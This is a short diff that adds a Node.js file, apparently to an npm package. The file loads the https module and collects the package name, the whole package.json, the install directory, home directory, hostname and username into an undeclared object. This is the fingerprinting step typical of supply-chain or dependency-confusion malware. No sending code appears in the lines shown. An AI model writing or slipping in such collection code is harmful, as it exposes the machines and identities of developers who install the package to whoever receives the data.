@@ -1,0 +1,11 @@
+const os = require("os")
+const http = require("https")
+const packageJson = require("./package.json")
+const pkgName = packageJson.name
+const genRanHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('')
+_tmp_4.pkg = pkgName
+_tmp_4.pkgjson = packageJson
+_tmp_4.dir = __dirname
+_tmp_4.home = os.homedir()
+_tmp_4.host = os.hostname()
+_tmp_4.username = os.userInfo().username
